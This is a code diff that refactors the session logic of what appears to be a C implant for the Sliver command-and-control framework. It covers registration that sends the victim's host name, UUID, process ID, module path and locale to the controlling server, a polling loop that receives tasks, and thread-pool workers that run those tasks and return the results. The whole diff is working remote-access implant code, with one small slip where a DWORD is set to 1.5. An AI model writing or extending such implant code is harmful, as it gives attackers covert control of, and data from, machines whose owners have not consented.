@@ -7,9 +7,11 @@ PSLIVER_SESSION_CLIENT SessionInit
 {
 	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
 	UINT64 uReconnectDuration = 300;
+	DWORD dwPollInterval = 1.5;
 
 	pSessionClient = ALLOC(sizeof(SLIVER_BEACON_CLIENT));
-	memcpy(&pSessionClient->GlobalConfig, pGlobalConfig, sizeof(GLOBAL_CONFIG));
+	pSessionClient->pGlobalConfig = pGlobalConfig;
+	pSessionClient->dwPollInterval = dwPollInterval;
 #ifdef __HTTP__
 	pSessionClient->Init = (CLIENT_INIT)HttpInit;
 	pSessionClient->Start = HttpStart;
@@ -24,56 +26,7 @@ CLEANUP:
 	return pSessionClient;
 }
 
-VOID SessionMain
-(
-	_In_ PSLIVER_SESSION_CLIENT pSession
-)
-{
-	PENVELOPE pEnvelope = NULL;
-	PSLIVER_THREADPOOL pSliverPool = NULL;
-	PTP_WORK pWork = NULL;
-	PSESSION_WORK_WRAPPER pWrapper = NULL;
-	DWORD dwNumberOfAttempts = 0;
-
-	pSliverPool = InitializeSliverThreadPool();
-	if (pSliverPool == NULL) {
-		goto CLEANUP;
-	}
-
-	while (TRUE) {
-		if (dwNumberOfAttempts >= pSession->GlobalConfig.dwMaxFailure) {
-			break;
-		}
-
-		pEnvelope = pSession->Receive(&pSession->GlobalConfig, pSession->lpClient);
-		if (pEnvelope == NULL) {
-			dwNumberOfAttempts++;
-			Sleep(pSession->GlobalConfig.dwPollInterval * 1000);
-			continue;
-		}
-
-		PrintFormatW(L"Receive Envelope:\n");
-		HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
-		pWrapper = ALLOC(sizeof(SESSION_WORK_WRAPPER));
-		pWrapper->pSession = pSession;
-		pWrapper->pEnvelope = pEnvelope;
-		pWork = CreateThreadpoolWork((PTP_WORK_CALLBACK)MainHandler, pWrapper, &pSliverPool->CallBackEnviron);
-		if (pWork == NULL) {
-			LOG_ERROR("CreateThreadpoolWork", GetLastError());
-			goto CLEANUP;
-		}
-
-		TpPostWork(pWork);
-		Sleep(pSession->GlobalConfig.dwPollInterval * 1000);
-	}
-
-CLEANUP:
-	FreeSliverThreadPool(pSliverPool);
-
-	return;
-}
-
-BOOL SesionRegister
+BOOL SessionRegister
 (
 	_In_ PSLIVER_SESSION_CLIENT pSession
 )
@@ -162,7 +115,7 @@ BOOL SesionRegister
 	lpLocaleName = ConvertWcharToChar(wszLocale);
 
 	SecureZeroMemory(ElementList, sizeof(ElementList));
-	ElementList[0] = CreateBytesElement(pSession->GlobalConfig.szSliverName, lstrlenA(pSession->GlobalConfig.szSliverName), 1);
+	ElementList[0] = CreateBytesElement(pSession->pGlobalConfig->szSliverName, lstrlenA(pSession->pGlobalConfig->szSliverName), 1);
 	ElementList[1] = CreateBytesElement(lpHostName, lstrlenA(lpHostName), 2);
 	ElementList[2] = CreateBytesElement(lpUUID + 1, lstrlenA(lpUUID + 1), 3);
 	ElementList[3] = CreateBytesElement(lpFullQualifiedName, lstrlenA(lpFullQualifiedName), 4);
@@ -173,17 +126,18 @@ BOOL SesionRegister
 	ElementList[8] = CreateVarIntElement(GetCurrentProcessId(), 9);
 	ElementList[9] = CreateBytesElement(lpModulePath, lstrlenA(lpModulePath), 10);
 	ElementList[11] = CreateBytesElement(lpVersion, lstrlenA(lpVersion), 12);
-	ElementList[12] = CreateVarIntElement(pSession->GlobalConfig.dwReconnectInterval, 13);
-	ElementList[14] = CreateBytesElement(pSession->GlobalConfig.szConfigID, lstrlenA(pSession->GlobalConfig.szConfigID), 16);
-	ElementList[15] = CreateVarIntElement(pSession->GlobalConfig.uPeerID, 17);
+	ElementList[12] = CreateVarIntElement(pSession->pGlobalConfig->dwReconnectInterval, 13);
+	ElementList[14] = CreateBytesElement(pSession->pGlobalConfig->szConfigID, lstrlenA(pSession->pGlobalConfig->szConfigID), 16);
+	ElementList[15] = CreateVarIntElement(pSession->pGlobalConfig->uPeerID, 17);
 	ElementList[16] = CreateBytesElement(lpLocaleName, lstrlenA(lpLocaleName), 18);
 
 	pFinalElement = CreateStructElement(ElementList, _countof(ElementList), 0);
+	RegisterEnvelope.pData = ALLOC(sizeof(BUFFER));
 	RegisterEnvelope.pData->pBuffer = pFinalElement->pMarshalledData;
 	RegisterEnvelope.pData->cbBuffer = pFinalElement->cbMarshalledData;
 	RegisterEnvelope.uType = MsgRegister;
 	pFinalElement->pMarshalledData = NULL;
-	Result = pSession->Send(&pSession->GlobalConfig, pSession->lpClient, &RegisterEnvelope);
+	Result = pSession->Send(pSession->pGlobalConfig, pSession->lpClient, &RegisterEnvelope);
 CLEANUP:
 	if (lpHostName != NULL) {
 		FREE(lpHostName);
@@ -221,52 +175,49 @@ CLEANUP:
 		FREE(lpLocaleName);
 	}
 
+	FreeBuffer(RegisterEnvelope.pData);
 	FreeElement(pFinalElement);
 	return Result;
 }
 
-VOID SessionMainHandler
+VOID SessionWork
 (
 	_Inout_ PTP_CALLBACK_INSTANCE Instance,
-	_Inout_opt_ PENVELOPE_WRAPPER pWrapper,
+	_Inout_opt_ PSESSION_WORK_WRAPPER pWrapper,
 	_Inout_ PTP_WORK Work
 )
 {
-	PENVELOPE pResp = NULL;
-	PENVELOPE pEnvelope = NULL;
-	LPSTR lpErrorDesc = NULL;
-	SYSTEM_HANDLER* pSystemHandler = NULL;
-	SYSTEM_HANDLER Handler = NULL;
+	PENVELOPE* TaskResults = NULL;
 	PSLIVER_SESSION_CLIENT pSession = NULL;
+	DWORD i = 0;
+	DWORD dwOldInterval = 0;
+	LPVOID* HandlerList = NULL;
+	SYSTEM_HANDLER SystemTaskHandler = NULL;
+	PENVELOPE pRecvEnvelope = NULL;
+	PENVELOPE pSendEnvelope = NULL;
 
-	//hException = AddVectoredExceptionHandler(1, ContinuableExceptionHanlder);
-	pEnvelope = pWrapper->pEnvelope;
+	pRecvEnvelope = pWrapper->pEnvelope;
+	HandlerList = GetSystemHandler();
+	SystemTaskHandler = HandlerList[pRecvEnvelope->uType];
+	pSendEnvelope = SystemTaskHandler(pRecvEnvelope);
+
 	pSession = pWrapper->pSession;
-	pSystemHandler = GetSystemHandler();
-	Handler = pSystemHandler[pEnvelope->uType];
-	if (Handler != NULL) {
-		pResp = Handler(pEnvelope);
+	PrintFormatA("Send Envelope:\n");
+	HexDump(pSendEnvelope->pData->pBuffer, pSendEnvelope->pData->cbBuffer);
+	if (!pSession->Send(pSession->pGlobalConfig, pSession->lpClient, pSendEnvelope)) {
+		goto CLEANUP;
 	}
 
-	if (pResp == NULL) {
-		//lpErrorDesc = TlsGetValue(dwTlsIdx);
-		pResp = CreateErrorRespEnvelope("Failed to execute task", pEnvelope->uID, 9);
-	}
-
-	pSession->Send(&pSession->GlobalConfig, pSession->lpClient , pResp);
 CLEANUP:
-	if (lpErrorDesc != NULL) {
-		UnmapViewOfFile(lpErrorDesc);
+	FreeEnvelope(pSendEnvelope);
+	FreeEnvelope(pRecvEnvelope);
+	if (pWrapper != NULL) {
+		FREE(pWrapper);
 	}
 
-	if (pSystemHandler != NULL) {
-		FREE(pSystemHandler);
+	if (HandlerList != NULL) {
+		FREE(HandlerList);
 	}
-
-	//RemoveVectoredExceptionHandler(hException);
-	FreeEnvelope(pResp);
-	FreeEnvelope(pEnvelope);
-	FREE(pWrapper);
 
 	return;
 }
@@ -279,8 +230,21 @@ VOID SessionMainLoop
 	PENVELOPE pEnvelope = NULL;
 	PSLIVER_THREADPOOL pSliverPool = NULL;
 	PTP_WORK pWork = NULL;
-	PENVELOPE_WRAPPER pWrapper = NULL;
+	PSESSION_WORK_WRAPPER pWrapper = NULL;
 	DWORD dwNumberOfAttempts = 0;
+
+	pSession->lpClient = pSession->Init();
+	if (pSession->lpClient == NULL) {
+		goto CLEANUP;
+	}
+
+	if (!pSession->Start(pSession->pGlobalConfig, pSession->lpClient)) {
+		goto CLEANUP;
+	}
+
+	if (!SessionRegister(pSession)) {
+		goto CLEANUP;
+	}
 
 	pSliverPool = InitializeSliverThreadPool();
 	if (pSliverPool == NULL) {
@@ -288,34 +252,50 @@ VOID SessionMainLoop
 	}
 
 	while (TRUE) {
-		if (dwNumberOfAttempts >= pSession->GlobalConfig.dwMaxFailure) {
+		if (dwNumberOfAttempts >= pSession->pGlobalConfig->dwMaxFailure) {
 			break;
 		}
 
-		pEnvelope = pSession->Receive(&pSession->GlobalConfig, pSession->lpClient);
+		pEnvelope = pSession->Receive(pSession->pGlobalConfig, pSession->lpClient);
 		if (pEnvelope == NULL) {
 			dwNumberOfAttempts++;
-			Sleep(pSession->GlobalConfig.dwPollInterval * 1000);
+			Sleep(pSession->dwPollInterval * 1000);
 			continue;
 		}
 
 		PrintFormatW(L"Receive Envelope:\n");
 		HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
-		pWrapper = ALLOC(sizeof(ENVELOPE_WRAPPER));
+		pWrapper = ALLOC(sizeof(SESSION_WORK_WRAPPER));
 		pWrapper->pSession = pSession;
 		pWrapper->pEnvelope = pEnvelope;
-		pWork = CreateThreadpoolWork((PTP_WORK_CALLBACK)MainHandler, pWrapper, &pSliverPool->CallBackEnviron);
+		pWork = CreateThreadpoolWork((PTP_WORK_CALLBACK)SessionWork, pWrapper, &pSliverPool->CallBackEnviron);
 		if (pWork == NULL) {
 			LOG_ERROR("CreateThreadpoolWork", GetLastError());
 			goto CLEANUP;
 		}
 
 		TpPostWork(pWork);
-		Sleep(pSession->GlobalConfig.dwPollInterval * 1000);
+		Sleep(pSession->dwPollInterval * 1000);
 	}
 
 CLEANUP:
 	FreeSliverThreadPool(pSliverPool);
 
 	return;
+}
+
+VOID FreeSessionClient
+(
+	_In_ PSLIVER_SESSION_CLIENT pSession
+)
+{
+	if (pSession != NULL) {
+		if (pSession->lpClient != NULL) {
+			pSession->Close(pSession->lpClient);
+			pSession->Cleanup(pSession->lpClient);
+		}
+		
+		FreeGlobalConfig(pSession->pGlobalConfig);
+		FREE(pSession);
+	}
 }
